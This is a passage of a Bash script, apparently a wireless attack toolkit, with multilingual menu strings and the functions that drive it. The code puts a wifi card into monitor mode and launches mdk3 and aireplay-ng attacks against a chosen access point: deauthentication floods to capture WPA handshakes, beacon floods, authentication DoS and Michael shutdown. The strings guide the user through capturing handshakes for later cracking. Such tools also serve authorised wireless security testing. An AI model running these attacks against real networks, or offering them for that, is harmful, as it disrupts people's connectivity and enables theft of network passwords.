	arr["french",119]="5.  Menu des outils pour Handshake"
	arr["catalan",119]="5.  Menú d'eines Handshake"

	arr["english",120]="Handshake tools menu"
	arr["spanish",120]="Menú de herramientas Handshake"
	arr["french",120]="Menu des outils pour Handshake"
	arr["catalan",120]="Menú d'eines Handshake"

	arr["english",121]="5.  Capture Handshake"
	arr["spanish",121]="5.  Capturar Handshake"
	arr["french",121]="5.  Capture du Handshake"
	arr["catalan",121]="5.  Captura Handshake"

	arr["english",122]="6.  Clean/optimize captured Handshake file"
	arr["spanish",122]="6.  Limpiar/optimizar fichero de Handshake capturado"
	arr["french",122]="6.  Laver/optimiser le fichier Handshake capturé"
	arr["catalan",122]="6.  Netejar/optimitzar fitxer de Handshake capturat"

	arr["english",123]="7.  Return to main menu"
	arr["spanish",123]="7.  Volver al menú principal"
	arr["french",123]="7.  Retourner au menu principal"
	arr["catalan",123]="7.  Tornar al menú principal"

	arr["english",124]="---------(monitor mode needed for capturing)---------"
	arr["spanish",124]="---------(modo monitor requerido en captura)---------"
	arr["french",124]="------(modo moniteur nécessaire pour la capture)------"
	arr["catalan",124]="---------(mode monitor requerit en captura)----------"

	arr["english",125]="There is no valid target network selected. You'll be redirected to select one"
	arr["spanish",125]="No hay una red objetivo válida seleccionada. Serás redirigido para seleccionar una"
	arr["french",125]="Le choix du réseau cible est incorrect. Vous allez être redirigé vers le menu de sélection pour effectuer un nouveau choix"
	arr["catalan",125]="No hi ha una xarxa objectiu vàlida seleccionada. Seràs redirigit per seleccionar una"

	arr["english",126]="You have a valid WPA/WPA2 target network selected. Script can continue..."
	arr["spanish",126]="Tienes una red objetivo WPA/WPA2 válida seleccionada. El script puede continuar..."
	arr["french",126]="Choix du réseau cible WPA/WPA2 valide. Le script peut continuer..."
	arr["catalan",126]="Tens una xarxa objectiu WPA/WPA2 vàlida seleccionada. L'script pot continuar..."

	arr["english",127]="The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Capture Handshake"
	arr["spanish",127]="El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Captura Handshake"
	arr["french",127]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
	arr["catalan",127]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Captura Handshake"

	arr["english",128]="Select a wifi card to work in order to be able to do more actions than with an ethernet interface"
	arr["spanish",128]="Selecciona una interfaz wifi para poder realizar más acciones que con una interfaz ethernet"
	arr["french",128]="Veuillez sélectionner une carte wifi au lieu d'une carte ethernet afin d'être en mesure de réaliser plus d'actions"
	arr["catalan",128]="Seleccioneu una targeta wifi per treballar amb la finalitat de ser capaç de fer més accions que amb una interfície ethernet"

	arr["english",129]="The natural order to proceed in this menu is usually: 1-Select wifi card 2-Put it in monitor mode 3-Select target network 4-Start attack"
	arr["spanish",129]="El orden natural para proceder en este menú suele ser: 1-Elige tarjeta wifi 2-Ponla en modo monitor 3-Elige red objetivo 4-Comienza el ataque"
	arr["french",129]="La marche à suivre est généralement: 1-Selectionner la carte wifi 2-Activer le mode moniteur 3-Choisir un réseau cible 4-Capturer le Handshake"
	arr["catalan",129]="L'ordre natural per procedir a aquest menú sol ser: 1-Tria targeta wifi 2-Posa-la en mode monitor 3-Tria xarxa objectiu 4-Iniciar l'atac"

	arr["english",130]="Remember to select a target network with clients to capture Handshake"
	arr["spanish",130]="Recuerda seleccionar una red objetivo con clientes para capturar el Handshake"
	arr["french",130]="Rappelez-vous de sélectionner un réseau cible avec un/des client(s) connecté(s) pour pouvoir capturer un Handshake"
	arr["catalan",130]="Recordi que ha de seleccionar una xarxa de destinació amb els clients per capturar el Handshake"

	arr["english",131]="Not all attacks affect all access points. If an attack is not working against an access point, choose another one ;)"
	arr["spanish",131]="No todos los ataques afectan a todos los puntos de acceso. Si un ataque no funciona contra un punto de acceso, elige otro ;)"
	arr["french",131]="Toutes les attaques n'affectent pas les points d'accès de la même manière. Si une attaque ne donne pas de résultats, choisissez en une autre ;)"
	arr["catalan",131]="No tots els atacs afecten tots els punts d'accés. Si un atac no està treballant en contra d'un punt d'accés, trie un altre ;)"

	arr["english",132]="After capturing a handshake clean it. It will reduce the file size and will be more optimal for use later"
	arr["spanish",132]="Tras capturar un Handshake límpialo. Reducirá el tamaño del archivo y será más óptimo para utilizarlo después"
	arr["french",132]="Après avoir capturé un Handshake il est recommandable de le nettoyer: Vous en réduirez ainsi le poids et il sera optimisé pour être traité a posteriori"
	arr["catalan",132]="Després capturar un Handshake neteja'l. Reduirà la mida del fitxer i serà més òptim per utilitzar-lo després"

	arr["english",133]="If you select a target network with hidden ESSID, you can't use it, but you can perform BSSID based attacks to that network"
	arr["spanish",133]="Si seleccionas una red objetivo con el ESSID oculto, no podrás usarlo, pero puedes hacer ataques basados en BSSID sobre esa red"
	arr["french",133]="Si vous sélectionnez un réseau cible avec un ESSID caché, vous n'allez pas pouvoir utiliser l'ESSID pour attaquer; mais vous pourrez effectuer les attaques basées sur le BSSID du réseau"
	arr["catalan",133]="Si selecciones una xarxa objectiu amb el ESSID ocult, no podràs usar-lo, però pots fer atacs basats en BSSID sobre aquesta xarxa"

	arr["english",134]="If your Linux is a virtual machine, it is possible that integrated wifi cards are detected as ethernet. Use an external usb wifi card"
	arr["spanish",134]="Si tu Linux es una máquina virtual, es posible que las tarjetas wifi integradas sean detectadas como ethernet. Utiliza una tarjeta wifi externa usb"
	arr["french",134]="Si votre système d'exploitation Linux est lancé dans une machine virtuelle, il est probable que les cartes wifi internes soient détectées comme des cartes ethernet. Il vaut mieux dans ce cas utiliser un dispositif wifi usb"
	arr["catalan",134]="Si el teu Linux és una màquina virtual, és possible que les targetes wifi integrades siguin detectades com ethernet. Utilitza una targeta wifi externa usb"

	arr["english",135]="Type of encryption: "${pink_color}"$enc"${normal_color}
	arr["spanish",135]="Tipo de encriptado: "${pink_color}"$enc"${normal_color}
	arr["french",135]="Type de chiffrement: "${pink_color}"$enc"${normal_color}
	arr["catalan",135]="Tipus d'encriptat: "${pink_color}"$enc"${normal_color}

	arr["english",136]="Obtaining a Handshake is only for networks with encryption WPA or WPA2"
	arr["spanish",136]="La obtención de un Handshake es solo para redes con encriptación WPA o WPA2"
	arr["french",136]="L'obtention d'un Handshake est seulement possible sur des réseaux protégés par chiffrement WPA ou WPA2"
	arr["catalan",136]="L'obtenció d'un Handshake és només per a xarxes amb encriptació WPA o WPA2"

	arr["english",137]="The selected network is invalid. To get a Handshake, encryption type of target network should be WPA or WPA2"
	arr["spanish",137]="La red seleccionada no es válida. Para obtener un Handshake, el tipo de encriptación de la red objetivo debe ser WPA o WPA2"
	arr["french",137]="Le réseau sélectionné est invalide . Pour obtenir un Handshake le réseau cible doit être en WPA ou WPA2"
	arr["catalan",137]="La xarxa seleccionada no és vàlida. Per obtenir un Handshake, el tipus d'encriptació de la xarxa objectiu ha de ser WPA o WPA2"

	arr["english",138]="Attack for Handshake"
	arr["spanish",138]="Ataque para Handshake"
	arr["french",138]="Attaque pour obtenir un Handshake"
	arr["catalan",138]="Atac de Handshake"

	arr["english",139]="1.  Deauth / disassoc amok mdk3 attack"
	arr["spanish",139]="1.  Ataque Deauth / Disassoc amok mdk3"
	arr["french",139]="1.  Attaque Deauth / Disassoc amok mdk3"
	arr["catalan",139]="1.  Attaque Deauth / Disassoc amok mdk3"

	arr["english",140]="2.  Deauth aireplay attack"
	arr["spanish",140]="2.  Ataque Deauth aireplay"
	arr["french",140]="2.  Attaque Deauth aireplay"
	arr["catalan",140]="2.  Atac Deauth aireplay"

	arr["english",141]="3.  WIDS / WIPS / WDS Confusion attack"
	arr["spanish",141]="3.  Ataque WIDS / WIPS / WDS Confusion"
	arr["french",141]="3.  Attaque WIDS / WIPS / WDS Confusion"
	arr["catalan",141]="3.  Atac WIDS / WIPS / WDS Confusion"

	arr["english",142]="If the Handshake doesn't appear after an attack, try again or change the type of attack"
	arr["spanish",142]="Si tras un ataque el Handshake no aparece, vuelve a intentarlo o cambia de ataque hasta conseguirlo"
	arr["french",142]="Si vous n'obtenez pas le Handshake après une attaque, veuillez recommencer ou bien changer d'attaque jusqu'à son obtention"
	arr["catalan",142]="Si després d'un atac el Handshake no apareix, torna a intentar-ho o canvia d'atac fins a aconseguir-"

	arr["english",143]="Two windows will be opened. One with the Handshake capturer and other with the attack to force clients to reconnect"
	arr["spanish",143]="Se abrirán dos ventanas. Una con el capturador del Handshake y otra con el ataque para expulsar a los clientes y forzarles a reconectar"
	arr["french",143]="Deux fenêtres vont s'ouvrir: La première pour capturer le handshake et la deuxième pour effectuer l'attaque visant à expulser les clients du réseau et les forcer à renégocier un Handshake pour se reconnecter"
	arr["catalan",143]="S'obren dues finestres. Una amb el capturador de Handshake i una altra amb l'atac per expulsar els clients i forçar-los a reconnectar"

	arr["english",144]="Don't close any window manually, script will do when needed. In about 20 seconds maximum you'll know if you've got the Handshake"
	arr["spanish",144]="No cierres manualmente ninguna ventana, el script lo hará cuando proceda. En unos 20 segundos como máximo sabrás si conseguiste el Handshake"
	arr["french",144]="Ne pas fermer une des fenêtres manuellement:  Le script va le faire automatiquement si besoin est. Vos saurez dans tout a plus 20 secondes si avez obtenu le Handshake"
	arr["catalan",144]="No tancaments manualment cap finestra, l'script ho farà quan sigui procedent. En uns 20 segons com a màxim sabràs si has aconseguit el Handshake"

	arr["english",145]="Did you get the Handshake? "${pink_color}"(Look at the top right corner of the capture window) "${normal_color}"[y/n]"
	arr["spanish",145]="¿Conseguiste el Handshake? "${pink_color}"(Mira en la parte superior derecha de la ventana de captura) "${normal_color}"[y/n]"
	arr["french",145]="Avez-vous obtenu le Handshake? "${pink_color}"(Regardez dans le coin supérieur en haut à droite de la fenêtre de capture) "${normal_color}"[y/n]"
	arr["catalan",145]="¿Has aconseguit el Handshake? "${pink_color}"(Mira a la part superior dreta de la finestra de captura) "${normal_color}"[y/n]"

	arr["english",146]="It seems we failed... try it again or choose another attack"
	arr["spanish",146]="Parece que no lo hemos conseguido... inténtalo de nuevo o elige otro ataque"
	arr["french",146]="Il semble que c'est un échec... Essayez à nouveau ou choisissez une autre attaque"
	arr["catalan",146]="Sembla que no ho hem aconseguit... intenta-ho de nou o tria un altre atac"

	arr["english",147]="4.. Return to Handshake tools menu"
	arr["spanish",147]="4.  Volver al menú de herramientas Handshake"
	arr["french",147]="4.  Retourner au menu des outils pour la capture du handshake"
	arr["catalan",147]="4.  Tornar al menú d'eines Handshake"

	arr["english",148]="Type the path to store the file or press Enter to accept the default proposal"${normal_color}"[$handshakepath]"
	arr["spanish",148]="Escribe la ruta donde guardaremos el fichero o pulsa Enter para aceptar la propuesta por defecto "${normal_color}"[$handshakepath]"
	arr["french",148]="Entrez le chemin où vous voulez garder le fichier ou bien appuyez sur Entrée pour prendre le chemin proposé par défaut"${normal_color}"[$handshakepath]"
	arr["catalan",148]="Escriu la ruta on guardarem el fitxer o prem Enter per acceptar la proposta per defecte"${normal_color}"[$handshakepath]"

	arr["english",149]="Handshake file generated successfully at ["${normal_color}"$enteredpath"${blue_color}"]. Returning to menu..."
	arr["spanish",149]="Fichero de Handshake generado con éxito en ["${normal_color}"$enteredpath"${blue_color}"]. Volviendo al menú..."
	arr["french",149]="Fichier Handshake généré avec succès dans ["${normal_color}"$enteredpath"${blue_color}"]. Retour au menu..."
	arr["catalan",149]="Fitxer de Handshake generat amb èxit a ["${normal_color}"$enteredpath"${blue_color}"]. Tornant al menú..."

	arr["english",150]="No captured Handshake file detected during this session..."
	arr["spanish",150]="No se ha detectado ningún fichero de Handshake capturado en esta sesión..."
	arr["french",150]="Aucun fichier Handshake valide détecté durant cette session..."
	arr["catalan",150]="No s'ha detectat un fitxer de Handshake capturat en aquesta sessió..."

	arr["english",151]="Handshake captured file detected during this session ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["spanish",151]="Se ha detectado un fichero de Handshake capturado en esta sesión ["${normal_color}"$enteredpath"${blue_color}"]"
	arr["french",151]="Un fichier contenant un Handshake a été détecté pour la session effectuée et se trouve dans "${normal_color}"$enteredpath"${blue_color}"]"
	arr["catalan",151]="S'ha detectat un fitxer de Handshake capturat en aquesta sessió ["${normal_color}"$enteredpath"${blue_color}"]"

	arr["english",152]="Do you want to clean/optimize the Handshake captured file during this session? "${normal_color}"[y/n]"
	arr["spanish",152]="¿Quieres limpiar/optimizar el fichero de Handshake capturado en esta sesión? "${normal_color}"[y/n]"
	arr["french",152]="Voulez-vous nettoyer/optimiser le fichier Handshake capturé pendant cette session? "${normal_color}"[y/n]"
	arr["catalan",152]="Vols netejar/optimitzar el fitxer de Handshake capturat en aquesta sessió? "${normal_color}"[y/n]"

	arr["english",153]="File cleaned/optimized successfully"
	arr["spanish",153]="Fichero limpiado/optimizado con éxito"
	arr["french",153]="Fichier lavé/optimisé avec succès"
	arr["catalan",153]="Fitxer netejat/optimitzat amb èxit"

	arr["english",154]="Set path to file :"
	arr["spanish",154]="Introduce la ruta al fichero :"
	arr["french",154]="Entrez le chemin vers le fichier :"
	arr["catalan",154]="Introdueix la ruta al fitxer :"

	arr["english",155]="The directory exists but you didn't specify filename. It will be autogenerated ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
	arr["spanish",155]="El directorio existe pero no se especificó nombre de fichero. Se autogenerará ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
	arr["french",155]="Le dossier existe mais sans qu'aucun nom pour le fichier soit précisé. Il sera donc appelé ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"
	arr["catalan",155]="El directori existeix però no s'ha especificat nom de fitxer. es autogenerará ["${normal_color}"$standardhandshake_filename"${yellow_color}"]"

	arr["english",156]="Directory not exists"
	arr["spanish",156]="El directorio no existe"
	arr["french",156]="Le dossier n'existe pas"
	arr["catalan",156]="El directori no existeix"

	arr["english",157]="The path exists but you don't have write permissions"
	arr["spanish",157]="La ruta existe pero no tienes permisos de escritura"
	arr["french",157]="Le chemin existe mais vous ne disposez pas des permis d'écriture"
	arr["catalan",157]="La route existe, mais vous ne disposez pas des autorisations d'écriture"

	arr["english",158]="The path is valid and you have write permissions. Script can continue..."
	arr["spanish",158]="La ruta es válida y tienes permisos de escritura. El script puede continuar..."
	arr["french",158]="Le chemin est valide et vous disposez des privilèges nécessaires pour l'écriture. Le script peut continuer..."
	arr["catalan",158]="La ruta és vàlida i tens permisos d'escriptura. L'script pot continuar..."

	arr["english",159]="The file doesn't need to be cleaned/optimized. It is already"
	arr["spanish",159]="El fichero no necesita ser limpiado/optimizado. Ya lo está"
	arr["french",159]="Le fichier n'a pas besoin d'être nettoyé/optimisé. Il l'est déjà"
	arr["catalan",159]="El fitxer no necessita ser netejat/optimitzat. Ja ho està"

	arr["english",160]="No tasks to perform on exit"
	arr["spanish",160]="No hay que realizar ninguna tarea a la salida"
	arr["french",160]="Aucune opération n'est planifiée pour l’arrêt du script"
	arr["catalan",160]="No cal fer cap tasca a la sortida"

	arr["english",161]="File not exists"
	arr["spanish",161]="El fichero no existe"
	arr["french",161]="Le fichier n' existe pas"
	arr["catalan",161]="El fitxer no existeix"

	arr["english",162]="Congratulations!!"
	arr["spanish",162]="Enhorabuena!!"
	arr["french",162]="Félicitations!!"
	arr["catalan",162]="Enhorabona!!"

	arr["english",163]="It is recommended to launch the script as root user or using \"sudo\". Make sure you have permission to launch commands like rfkill or airmon for example"
	arr["spanish",163]="Se recomienda lanzar el script como usuario root o usando \"sudo\". Asegúrate de tener permisos para lanzar comandos como rfkill o airmon por ejemplo"
	arr["french",163]="Il est recommandé de lancer le script en tant que root ou en utilisant \"sudo\". Assurez-vous que vous disposez bien des privilèges nécessaires à l’exécution de commandes comme rfkill ou airmon par exemple"
	arr["catalan",163]="Es recomana llançar l'script com a usuari root o utilitzeu \"sudo\". Assegura't de tenir permisos per llançar ordres com rfkill o airmon per exemple"

	arr["english",164]="Cleaning temp files"
	arr["spanish",164]="Limpiando archivos temporales"
	arr["french",164]="Effacement des fichiers temporaires"
	arr["catalan",164]="Netejant arxius temporals"

	arr["english",165]="Checking if cleaning/restoring tasks are needed..."
	arr["spanish",165]="Comprobando si hay que realizar tareas de limpieza/restauración..."
	arr["french",165]="Vérification de la nécessité d'effectuer ou pas des opérations de nettoyage/restauration..."
	arr["catalan",165]="Comprovant si cal realitzar tasques de neteja/restauració..."

	arr["english",166]="Do you want to preserv monitor mode for your card on exit? "${normal_color}"[y/n]"
	arr["spanish",166]="¿Deseas conservar el modo monitor de tu interfaz al salir? "${normal_color}"[y/n]"
	arr["french",166]="Voulez-vous laisser votre interface en mode moniteur après l'arrêt du script? "${normal_color}"[y/n]"
	arr["catalan",166]="Vols conservar el mode monitor del teu interfície en sortir? "${normal_color}"[y/n]"

	arr["english",167]="Putting your interface in managed mode"
	arr["spanish",167]="Poniendo interfaz en modo managed"
	arr["french",167]="L'interface est en train de passer en mode managed"
	arr["catalan",167]="Configurant la interfície en mode managed"

	arr["english",168]="Launching previously killed processes"
	arr["spanish",168]="Arrancando procesos cerrados anteriormente"
	arr["french",168]="Lancement des processus précédemment tués"
	arr["catalan",168]="Llançant processos tancats anteriorment"

	case "$3" in
		"yellow")
			echo_yellow "${arr[$1,$2]}"
		;;
		"blue")
			echo_blue "${arr[$1,$2]}"
		;;
		"red")
			echo_red "${arr[$1,$2]}"
		;;
		"green")
			echo_green "${arr[$1,$2]}"
		;;
		"pink")
			echo_pink "${arr[$1,$2]}"
		;;
		"titlered")
			generate_title "${arr[$1,$2]}" "red"
		;;
		"read")
			read -p "${arr[$1,$2]}"
		;;
		"multiline")
			echo -ne "${arr[$1,$2]}"
		;;
		"hint")
			echo_pink "*${hintprefix[$language]}* ${arr[$1,$2]}"
		;;
		*)
			echo -e "${arr[$1,$2]}"
		;;
	esac
}

function generate_title() {

	ncharstitle=78
	titlechar="*"
	titletext=$1
	titlelength=${#titletext}
	finaltitle=""

	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
		finaltitle="$finaltitle$titlechar"
	done

	finaltitle="$finaltitle $titletext "

	for ((i=0; i < ($ncharstitle/2 - $titlelength+($titlelength/2)); i++)); do
		finaltitle="$finaltitle$titlechar"
	done

	if [ $(($titlelength % 2)) -gt 0 ]; then
		finaltitle+="$titlechar"
	fi

	case "$2" in
		"yellow")
			echo_yellow "$finaltitle"
		;;
		"red")
			echo_red "$finaltitle"
		;;
		"blue")
			echo_blue "$finaltitle"
		;;
		"green")
			echo_green "$finaltitle"
		;;
		"pink")
			echo_pink "$finaltitle"
		;;
		*)
			echo -e "$finaltitle"
		;;
	esac
}

function check_to_set_managed() {

	check_interface_mode
	case "$ifacemode" in
		"Managed")
			echo
			language_strings ${language} 0 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings ${language} 1 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
	esac
	return 0
}

function check_to_set_monitor() {

	check_interface_mode
	case "$ifacemode" in
		"Monitor")
			echo
			language_strings ${language} 10 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
		"(Non wifi card)")
			echo
			language_strings ${language} 13 "yellow"
			language_strings ${language} 115 "read"
			return 1
		;;
	esac
	return 0
}

function check_monitor_enabled() {

	mode=`iwconfig ${interface} 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`

	if [[ ${mode} != "Monitor" ]]; then
		echo
		language_strings ${language} 14 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi
	return 0
}

function disable_rfkill() {

	if hash rfkill 2> /dev/null; then
		for i in 0 1 2 3 4 5; do
			rfkill unblock ${i} > /dev/null
		done
	fi
}

function managed_option() {

	check_to_set_managed

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings ${language} 17 "blue"
	ifconfig ${interface} up

	new_interface=$(${airmon} stop ${interface} | grep station | cut -d ']' -f 2)
	new_interface=${new_interface:: -1}

	if [ "$interface" != "$new_interface" ]; then
		echo
		language_strings ${language} 15 "yellow"
		interface=${new_interface}
	fi

	echo
	language_strings ${language} 16 "yellow"
	language_strings ${language} 115 "read"
}

function monitor_option() {

	check_to_set_monitor

	if [ "$?" != "0" ]; then
		return
	fi

	disable_rfkill

	language_strings ${language} 18 "blue"

	ifconfig ${interface} up
	iwconfig ${interface} rate 1M > /dev/null 2>&1

	if [ "$?" != "0" ]; then
		echo
		language_strings ${language} 20 "yellow"
		language_strings ${language} 115 "read"
		return
	fi

	if [ ${check_kill_needed} -eq 1 ]; then
		language_strings ${language} 19 "blue"
		${airmon} check kill > /dev/null 2>&1
	fi

	new_interface=$(${airmon} start ${interface} | grep monitor | cut -d ']' -f 3)
	new_interface=${new_interface:: -1}

	if [ "$interface" != "$new_interface" ]; then
		echo
		language_strings ${language} 21 "yellow"
		interface=${new_interface}
	fi

	echo
	language_strings ${language} 22 "yellow"
	language_strings ${language} 115 "read"
}

function check_interface_mode() {

	iwconfig_fix
	iwcmd="iwconfig $interface $iwcmdfix > /dev/null 2> /dev/null"
	eval ${iwcmd}
	if [[ "$?" != "0" ]]; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=`iwconfig ${interface} 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1`

	if [[ ${modemanaged} = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=`iwconfig ${interface} 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2`

	if [[ ${modemonitor} = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings ${language} 23 "yellow"
	language_strings ${language} 115 "read"
	exit_script_option
}

function language_option() {

	clear
	language_strings ${language} 87 "titlered"
	language_strings ${language} 81 "green"
	echo_blue "---------"
	language_strings ${language} 79
	language_strings ${language} 80
	language_strings ${language} 113
	language_strings ${language} 116

	read language_selected
	case ${language_selected} in
		1)
			language="english"
			language_strings ${language} 83 "yellow"
			language_strings ${language} 115 "read"
		;;
		2)
			language="spanish"
			language_strings ${language} 84 "yellow"
			language_strings ${language} 115 "read"
		;;
		3)
			language="french"
			language_strings ${language} 112 "yellow"
			language_strings ${language} 115 "read"
		;;
		4)
			language="catalan"
			language_strings ${language} 117 "yellow"
			language_strings ${language} 115 "read"
		;;
		*)
			invalid_language_selected
		;;
	esac
}

function select_interface() {

	clear
	language_strings ${language} 88 "titlered"
	language_strings ${language} 24 "green"
	echo_blue "---------"
	ifaces=`ip link | egrep "^[0-9]+" | cut -d ':' -f 2 | awk {'print $1'} | grep lo -v`
	option_counter=0
	for item in ${ifaces}; do
		option_counter=$[option_counter + 1]
		echo "$option_counter. $item"
	done
	read iface
	if [ -z ${iface} ]; then
		invalid_iface_selected
		else if [[ ${iface} < 1 ]] || [[ ${iface} > ${option_counter} ]]; then
			invalid_iface_selected
		else
			option_counter2=0
			for item2 in ${ifaces}; do
				option_counter2=$[option_counter2 + 1]
				if [[ "$iface" = "$option_counter2" ]]; then
					interface=${item2}
					break;
				fi
			done
		fi
	fi
}

function read_yesno() {

	echo
	language_strings ${language} $1 "green"
	read yesno
}

function ask_yesno() {

	yesno=""
	while [[ ! ${yesno} =~ ^[YyNn]$ ]]; do
		read_yesno $1
	done

	if [ "$yesno" = "Y" ]; then
		yesno="y"
	fi
	if [ "$yesno" = "N" ]; then
		yesno="n"
	fi
}

function read_channel() {

	echo
	language_strings ${language} 25 "green"
	read channel
}

function ask_channel() {

	while [[ ! ${channel} =~ ^([1-9]|1[0-4])$ ]]; do
		read_channel
	done
	echo
	language_strings ${language} 26 "yellow"
}

function read_bssid() {

	echo
	language_strings ${language} 27 "green"
	read bssid
}

function ask_bssid() {

	while [[ ! ${bssid} =~ ^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$ ]]; do
		read_bssid
	done
	echo
	language_strings ${language} 28 "yellow"
}

function read_essid() {

	echo
	language_strings ${language} 29 "green"
	read essid
}

function ask_essid() {

	if [ -z "$essid" ]; then
		read_essid
		else if [ "$essid" = "(Hidden Network)" ]; then
			echo
			language_strings ${language} 30 "yellow"
			read_essid
		fi
	fi

	echo
	language_strings ${language} 31 "yellow"
}

function exec_mdk3deauth() {

	echo
	language_strings ${language} 89 "titlered"
	language_strings ${language} 32 "green"

	tmpfiles_toclean=1
	rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
	echo ${bssid} > ${tmpdir}"bl.txt"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel}
}

function exec_aireplaydeauth() {

	echo
	language_strings ${language} 90 "titlered"
	language_strings ${language} 32 "green"

	${airmon} start ${interface} ${channel} > /dev/null 2>&1

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}
}

function exec_wdsconfusion() {

	echo
	language_strings ${language} 91 "titlered"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel}
}

function exec_beaconflood() {

	echo
	language_strings ${language} 92 "titlered"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h
}

function exec_authdos() {

	echo
	language_strings ${language} 93 "titlered"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024
}

function exec_michaelshutdown() {

	echo
	language_strings ${language} 94 "titlered"
	language_strings ${language} 32 "green"

	echo
	language_strings ${language} 33 "blue"
	language_strings ${language} 4 "read"
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024
}

function mdk3_deauth_option() {

	echo
	language_strings ${language} 95 "titlered"
	language_strings ${language} 35 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	ask_channel
	exec_mdk3deauth
}

function aireplay_deauth_option() {

	echo
	language_strings ${language} 96 "titlered"
	language_strings ${language} 36 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	ask_channel
	exec_aireplaydeauth
}

function wds_confusion_option() {

	echo
	language_strings ${language} 97 "titlered"
	language_strings ${language} 37 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_essid
	ask_channel
	exec_wdsconfusion
}

function beacon_flood_option() {

	echo
	language_strings ${language} 98 "titlered"
	language_strings ${language} 38 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_essid
	ask_channel
	exec_beaconflood
}

function auth_dos_option() {

	echo
	language_strings ${language} 99 "titlered"
	language_strings ${language} 39 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	exec_authdos
}

function michael_shutdown_option() {

	echo
	language_strings ${language} 100 "titlered"
	language_strings ${language} 40 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return
	fi

	echo
	language_strings ${language} 34 "yellow"

	ask_bssid
	exec_michaelshutdown
}

function print_selections() {

	if [ -z "$interface" ]; then
		language_strings ${language} 41 "blue"
		echo
		language_strings ${language} 115 "read"
		select_interface
		${current_menu}
	else
		check_interface_mode
		language_strings ${language} 42 "blue"
	fi

	if [ -n "$bssid" ]; then
		language_strings ${language} 43 "blue"
		if [ -n "$channel" ]; then
			language_strings ${language} 44 "blue"
		fi
		if [ -n "$essid" ]; then
			if [ "$essid" = "(Hidden Network)" ]; then
				language_strings ${language} 45 "blue"
			else
				language_strings ${language} 46 "blue"
			fi
		fi
		if [ -n "$enc" ]; then
			language_strings ${language} 135 "blue"
		fi
	fi
}

function clean_target_network_vars() {

	bssid=""
	essid=""
	channel=""
	enc=""
}

function clean_tmpfiles() {

	rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
	rm -rf ${tmpdir}"wnws.txt" > /dev/null 2>&1
}

function store_array {

	local var=$1 base_key=$2 values=("${@:3}")
	for i in "${!values[@]}"; do
		eval "$1[\${base_key}|${i}]=\${values[i]}"
	done
}

function print_hint() {

	declare -A hints

	case ${1} in
		"main_menu")
			store_array hints main_hints "${main_hints[@]}"
			hintlength=${#main_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[main_hints|$randomhint]}
		;;
		"dos_attacks_menu")
			store_array hints dos_hints "${dos_hints[@]}"
			hintlength=${#dos_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
